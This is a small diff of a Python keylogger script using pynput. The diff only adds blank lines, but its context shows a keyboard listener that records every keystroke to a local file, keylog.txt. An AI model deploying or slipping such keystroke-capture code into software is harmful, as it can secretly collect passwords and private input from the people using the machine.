@@ -3,6 +3,7 @@ from pynput import keyboard
 # File to save the keystrokes
 log_file = "keylog.txt"
 
+
 def on_press(key):
     try:
         # Record alphanumeric keys
@@ -17,6 +18,7 @@ def on_press(key):
                 f.write("\n")
             else:
                 f.write(f" {str(key)} ")
+
 
 # Set up the listener
 with keyboard.Listener(on_press=on_press) as listener:
